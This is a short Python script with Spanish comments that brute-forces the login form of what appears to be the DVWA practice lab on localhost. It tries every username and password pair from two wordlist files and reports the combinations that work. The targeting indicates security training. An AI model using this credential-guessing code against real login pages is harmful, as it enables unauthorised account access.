import requests
import time

# URL del formulario de inicio de sesión
url = "http://localhost:4280/vulnerabilities/brute/"

# Cabeceras HTTP que has incluido en tu comando curl
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Connection': 'keep-alive',
    'Referer': 'http://localhost:4280/vulnerabilities/brute/',
    'Cookie': 'security=low; PHPSESSID=bdp4gm8jmd3csaovur15106o80',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i'
}

# Colores ANSI
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

# Lista de combinaciones de usuario/contraseña desde archivos
users_file = "username.txt"
passwords_file = "password.txt"

# Leer usuarios y contraseñas desde los archivos
with open(users_file, 'r') as f:
    usernames = [line.strip() for line in f.readlines()]

with open(passwords_file, 'r') as f:
    passwords = [line.strip() for line in f.readlines()]

# Almacenar combinaciones correctas
valid_combinations = []

# Iniciar el temporizador
start_time = time.time()

# Probar cada combinación de usuario/contraseña
for username in usernames:
    for password in passwords:
        # Parámetros de la solicitud
        params = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }

        # Enviar solicitud POST simulando el comportamiento de curl
        response = requests.get(url, headers=headers, params=params)

        # Verificar si el inicio de sesión fue exitoso (cambia el criterio según la página)
        if "Welcome" in response.text:
            print(f"{GREEN}¡Credenciales válidas! Usuario: {username}, Contraseña: {password}{RESET}")
            valid_combinations.append((username, password))
        else:
            print(f"{RED}Falló: Usuario: {username}, Contraseña: {password}{RESET}")

# Mostrar combinaciones válidas y tiempo de ejecución
print(f"Combinaciones válidas: {valid_combinations}")
